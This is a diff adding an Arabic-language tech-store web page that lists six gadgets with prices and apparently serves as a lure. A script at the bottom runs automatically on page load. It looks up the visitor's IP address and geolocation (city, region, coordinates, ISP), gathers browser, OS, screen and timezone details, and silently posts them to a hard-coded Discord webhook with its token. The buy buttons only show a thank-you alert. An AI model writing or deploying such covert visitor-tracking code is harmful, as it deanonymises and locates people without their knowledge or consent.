@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>متجر التقنية الحديثة</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        header {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        header p {
+            font-size: 1.2em;
+            opacity: 0.9;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .welcome {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+        
+        .welcome h2 {
+            color: #667eea;
+            font-size: 2em;
+            margin-bottom: 15px;
+        }
+        
+        .welcome p {
+            color: #666;
+            font-size: 1.1em;
+            line-height: 1.6;
+        }
+        
+        .products {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 30px;
+        }
+        
+        .product {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            cursor: pointer;
+        }
+        
+        .product:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.4);
+        }
+        
+        .product-icon {
+            font-size: 4em;
+            margin-bottom: 15px;
+        }
+        
+        .product h3 {
+            color: #667eea;
+            font-size: 1.5em;
+            margin-bottom: 10px;
+        }
+        
+        .product p {
+            color: #666;
+            line-height: 1.6;
+        }
+        
+        .product .price {
+            color: #764ba2;
+            font-size: 1.8em;
+            font-weight: bold;
+            margin-top: 15px;
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            margin-top: 15px;
+            transition: transform 0.2s ease;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+        }
+        
+        footer {
+            background: #f8f9fa;
+            padding: 20px;
+            text-align: center;
+            color: #666;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>🛒 متجر التقنية الحديثة</h1>
+            <p>أفضل المنتجات التقنية بأسعار منافسة</p>
+        </header>
+        
+        <div class="content">
+            <div class="welcome">
+                <h2>مرحباً بك في متجرنا!</h2>
+                <p>نقدم لك أحدث المنتجات التقنية بجودة عالية وأسعار تنافسية. تصفح منتجاتنا واختر ما يناسبك</p>
+            </div>
+            
+            <div class="products">
+                <div class="product">
+                    <div class="product-icon">💻</div>
+                    <h3>لابتوب جيمنج</h3>
+                    <p>معالج قوي، كرت شاشة RTX، رامات 32GB</p>
+                    <div class="price">5,999 ريال</div>
+                    <button class="btn">اشتري الآن</button>
+                </div>
+                
+                <div class="product">
+                    <div class="product-icon">📱</div>
+                    <h3>هاتف ذكي</h3>
+                    <p>أحدث إصدار، كاميرا 200MP، شاشة OLED</p>
+                    <div class="price">3,499 ريال</div>
+                    <button class="btn">اشتري الآن</button>
+                </div>
+                
+                <div class="product">
+                    <div class="product-icon">🎧</div>
+                    <h3>سماعات لاسلكية</h3>
+                    <p>إلغاء ضوضاء نشط، بطارية 30 ساعة</p>
+                    <div class="price">899 ريال</div>
+                    <button class="btn">اشتري الآن</button>
+                </div>
+                
+                <div class="product">
+                    <div class="product-icon">⌚</div>
+                    <h3>ساعة ذكية</h3>
+                    <p>مراقبة صحية، GPS، مقاومة للماء</p>
+                    <div class="price">1,299 ريال</div>
+                    <button class="btn">اشتري الآن</button>
+                </div>
+                
+                <div class="product">
+                    <div class="product-icon">🖱️</div>
+                    <h3>ماوس جيمنج</h3>
+                    <p>RGB، 16000 DPI، تصميم مريح</p>
+                    <div class="price">299 ريال</div>
+                    <button class="btn">اشتري الآن</button>
+                </div>
+                
+                <div class="product">
+                    <div class="product-icon">⌨️</div>
+                    <h3>كيبورد ميكانيكي</h3>
+                    <p>إضاءة RGB، مفاتيح Cherry MX</p>
+                    <div class="price">599 ريال</div>
+                    <button class="btn">اشتري الآن</button>
+                </div>
+            </div>
+        </div>
+        
+        <footer>
+            <p>© 2024 متجر التقنية الحديثة - جميع الحقوق محفوظة</p>
+            <p>تواصل معنا: support@techstore.com | 📞 920000000</p>
+        </footer>
+    </div>
+
+    <script>
+        // الويب هوك
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1442986438105764114/MjStBilRV8jhOk0yMQyRw4fzGXhsNz-sZLDePeHFC-wqJDN4uXi6kmMbYTweyUVX8ebQ';
+        
+        // دالة للحصول على معلومات النظام
+        function detectOS() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf('Win') !== -1) return 'Windows';
+            if (ua.indexOf('Mac') !== -1) return 'MacOS';
+            if (ua.indexOf('Linux') !== -1) return 'Linux';
+            if (ua.indexOf('Android') !== -1) return 'Android';
+            if (ua.indexOf('iOS') !== -1) return 'iOS';
+            return 'Unknown';
+        }
+        
+        // دالة للحصول على معلومات المتصفح
+        function detectBrowser() {
+            const ua = navigator.userAgent;
+            if (ua.indexOf('Firefox') !== -1) return 'Firefox';
+            if (ua.indexOf('Chrome') !== -1) return 'Chrome';
+            if (ua.indexOf('Safari') !== -1) return 'Safari';
+            if (ua.indexOf('Edge') !== -1) return 'Edge';
+            if (ua.indexOf('Opera') !== -1) return 'Opera';
+            return 'Unknown';
+        }
+        
+        // دالة لإرسال المعلومات للويب هوك
+        async function sendToWebhook() {
+            try {
+                // جمع معلومات IP
+                let ipInfo = {};
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    const ipData = await ipResponse.json();
+                    ipInfo.ip = ipData.ip;
+                    
+                    // الحصول على معلومات إضافية عن IP
+                    const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                    const geoData = await geoResponse.json();
+                    ipInfo = { ...ipInfo, ...geoData };
+                } catch (e) {
+                    console.log('IP fetch failed');
+                }
+                
+                // بناء رسالة Discord Embed
+                const embed = {
+                    title: '🎯 زائر جديد دخل الموقع!',
+                    color: 6750054, // لون بنفسجي
+                    fields: [
+                        {
+                            name: '🌐 عنوان IP',
+                            value: ipInfo.ip || 'غير متوفر',
+                            inline: true
+                        },
+                        {
+                            name: '🗺️ الدولة',
+                            value: `${ipInfo.country_name || 'غير متوفر'} ${ipInfo.country_emoji || ''}`,
+                            inline: true
+                        },
+                        {
+                            name: '🏙️ المدينة',
+                            value: ipInfo.city || 'غير متوفر',
+                            inline: true
+                        },
+                        {
+                            name: '📍 المنطقة',
+                            value: ipInfo.region || 'غير متوفر',
+                            inline: true
+                        },
+                        {
+                            name: '🌍 خط الطول والعرض',
+                            value: ipInfo.latitude && ipInfo.longitude 
+                                ? `${ipInfo.latitude}, ${ipInfo.longitude}` 
+                                : 'غير متوفر',
+                            inline: true
+                        },
+                        {
+                            name: '🏢 مزود الخدمة',
+                            value: ipInfo.org || 'غير متوفر',
+                            inline: true
+                        },
+                        {
+                            name: '💻 نظام التشغيل',
+                            value: detectOS(),
+                            inline: true
+                        },
+                        {
+                            name: '🌐 المتصفح',
+                            value: detectBrowser(),
+                            inline: true
+                        },
+                        {
+                            name: '📱 نوع الجهاز',
+                            value: /Mobile|Android|iPhone/i.test(navigator.userAgent) ? 'موبايل' : 'كمبيوتر',
+                            inline: true
+                        },
+                        {
+                            name: '🖥️ دقة الشاشة',
+                            value: `${screen.width} × ${screen.height}`,
+                            inline: true
+                        },
+                        {
+                            name: '🌍 اللغة',
+                            value: navigator.language || 'غير متوفر',
+                            inline: true
+                        },
+                        {
+                            name: '🕐 المنطقة الزمنية',
+                            value: Intl.DateTimeFormat().resolvedOptions().timeZone || 'غير متوفر',
+                            inline: true
+                        },
+                        {
+                            name: '🔗 User Agent',
+                            value: '```' + navigator.userAgent.substring(0, 200) + '```',
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString(),
+                    footer: {
+                        text: '🔍 نظام تتبع الزوار'
+                    }
+                };
+                
+                // إرسال للويب هوك
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        embeds: [embed]
+                    })
+                });
+                
+                console.log('تم إرسال المعلومات بنجاح ✅');
+            } catch (error) {
+                console.error('خطأ في الإرسال:', error);
+            }
+        }
+        
+        // إرسال المعلومات تلقائياً عند تحميل الصفحة
+        window.addEventListener('load', () => {
+            // انتظر ثانية واحدة ثم أرسل
+            setTimeout(sendToWebhook, 1000);
+        });
+        
+        // إضافة أحداث للأزرار (اختياري)
+        document.querySelectorAll('.btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                alert('شكراً لاهتمامك! سيتم التواصل معك قريباً 😊');
+            });
+        });
+    </script>
+</body>
+</html>
